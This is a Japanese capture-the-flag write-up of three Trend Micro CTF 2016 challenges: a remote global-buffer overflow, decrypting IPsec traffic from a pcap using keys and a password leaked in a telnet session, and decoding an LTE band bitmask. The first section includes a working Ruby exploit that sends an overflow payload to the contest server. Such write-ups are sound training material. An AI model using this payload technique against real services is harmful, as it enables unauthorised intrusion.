+++
date = "2016-07-31T14:26:56+09:00"
title = "Trend Micro CTF 2016 Online qualifier"

+++

日本時間 2016-07-30 13:00 から 2016-07-31 13:00まで（24時間）に行われた[Trend Micro CTF 2016](http://www.trendmicro.co.jp/jp/sp/ctf2016_jp/)のwrite-upです。

urandomは4問解答し600点、92位でした。

# Analysis - Offensive 200

> Category: Analysis - offensive
>
> Points: 200
>
> This challenge is composed of a simple remote overflow of a global array. The server address is 52.197.128.90 and the vulnerable application listens on TCP port 80-85. Each port has the same behavior so you can select one of them.
>
> The following code contains a bug that can be exploited to read back a flag:
>
```c
int pwned;
char buffer[1024];

DWORD WINAPI CallBack(LPVOID lpParameter) {
	pwned = 0;
	ZeroMemory(buffer, 1024);
	SOCKET *sock = (SOCKET *)lpParameter;
	SOCKET _sock = *sock;
	send(_sock, "Welcome", 8, 0);
	int ret = 0;
	ret = recv(_sock, buffer, 1028, 0);
	printf("[x] RET: %d.\n", ret);
	printf("[x] PWNED: 0x%x.\n", pwned);
	Sleep(1);
	if (((pwned >> 16)&0xFFFF ^ 0xc0fe) == 0x7eaf && (((pwned & 0xFFFF)^0x1a1a) == 0xdae4)) {

			send(_sock, "PWNED", 5, 0);
			ReadAndReturn(L"key.txt", _sock);
			closesocket(_sock);
			return 0;
	}
	else {
		send(_sock, "GO AWAY", 7, 0);
		closesocket(_sock);
	}

	return 0;
 }
```
>
>
> Craft a packet that would return a valid flag. Good luck!

`buffer`が1024バイトしか確保されていないにもかかわらず、11行目で `ret = recv(_sock, buffer, 1028, 0);` と1028バイト読み込むようになっている。したがって、1025-1028バイトの範囲に特定のバイト列を仕込めばよい。満たすべき条件は15行目のif文。

なぜか `nc` が1024バイトで送信を打ち切ってしまったので、Rubyで書いた。

```ruby
require 'socket'

HOST = '52.197.128.90'
port = (80..85).to_a.sample

puts "connecting #{HOST}:#{port}"
sock = TCPSocket.open('52.197.128.90', port)

payload = 'a' * 1024 + "\xfe\xc0\x51\xbe"

sock.read(8)
sock.send(payload, 0)
while r = sock.gets
  puts r
end
```

そして正解をメモし忘れた 😇

# Misc 100

> Category: Misc(iot and network)
>
> Points: 100
>
> Please analyze this pcap.

pcapファイルが渡される。中身を見ると、IPsecな通信と、普通にtelnetしている通信がある。

Wiresharkでtelnetでのやりとりをテキストとして見ると、 `ip xfrm state`を叩いている箇所がある。

```
.]0;reds@localhost:~.[reds@localhost ~]$ sudo ip xfrm state
.sudo ip xfrm state
[sudo] password for reds: ynwa
.
src 1.1.1.11 dst 1.1.1.10
	proto esp spi 0xfab21777 reqid 16389 mode tunnel
	replay-window 32 flag 20
	auth hmac(sha1) 0x11cf27c5b3357a5fd5d26d253fffd5339a99b4d1
	enc cbc(aes) 0xfa19ff5565b1666d3dd16fcfda62820da44b2b51672a85fed155521bedb243ee
src 1.1.1.10 dst 1.1.1.11
	proto esp spi 0xbfd6dc1c reqid 16389 mode tunnel
	replay-window 32 flag 20
	auth hmac(sha1) 0x829b457814bd8856e51cce1d745619507ca1b257
	enc cbc(aes) 0x2a340c090abec9186c841017714a233fba6144b3cb20c898db4a30f02b0a003d
src 1.1.1.10 dst 1.1.1.11
	proto esp spi 0xeea1503c reqid 16389 mode tunnel
	replay-window 32 flag 20
	auth hmac(sha1) 0x951d2d93498d2e7479c28c1bcc203ace34d7fcde
	enc cbc(aes) 0x6ec6072dd25a6bcb7b9b3b516529acb641a1b356999f791eb971e57cc934a5eb
src 1.1.1.11 dst 1.1.1.10
	proto esp spi 0xd4d2074d reqid 16389 mode tunnel
	replay-window 32 flag 20
	auth hmac(sha1) 0x100a0b23fc006c867455506843cc96ad26026ec0
	enc cbc(aes) 0xdcfbc7d33d3c606de488c6efac4624ed50b550c88be0d62befb049992972cca6
```

この情報を元に、IPsecの通信の中身を見ることができる。すると、HTTPでいくつかやりとりをしている箇所が見つかる。その中に `flag.png` というファイルのダウンロードが含まれている。これを抽出して開くと、フラグが書かれている。


# Misc 200

> Category: Misc(iot and network)
>
> Points: 200
>
> find all LTE bands this phone supported.
>
> the final answer will be from small to big, and use ',' to seperate without spaces.
>
> example> if the answer is band 1 and 2 and 3, the key should be: "TMCTF{1,2,3}"

`ModemSettings.txt` というファイルが与えられ、そこからその携帯電話の対応しているLTEバンドを答える。

この `ModemSettings.txt` はどうやら NV-items_reader_writerというソフトウェアによる出力らしい。

LTEのバンドに関する設定は"6828"番にあるという。該当する箇所を引用する。

```
6828 (0x1AAC)   -   OK
FF 1D 1F 03 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
```

ここに書き込まれている数値が対応LTEバンドを表している。ビット単位で読んで、あるビットが立っていたら、そのビットと対応するバンドをサポートしていることを意味している。最右ビットがバンド1に対応する。

寝起きでつらいワンライナーを書いておしまい。エンディアンに注意。

```ruby
i=0; puts (0x031F1DFF).to_s(2).reverse.split(//).map { |c| i +=1; [c, i] }.select { |x| x[0] == '1' }.map { |x| x[1] }.join(',')
```
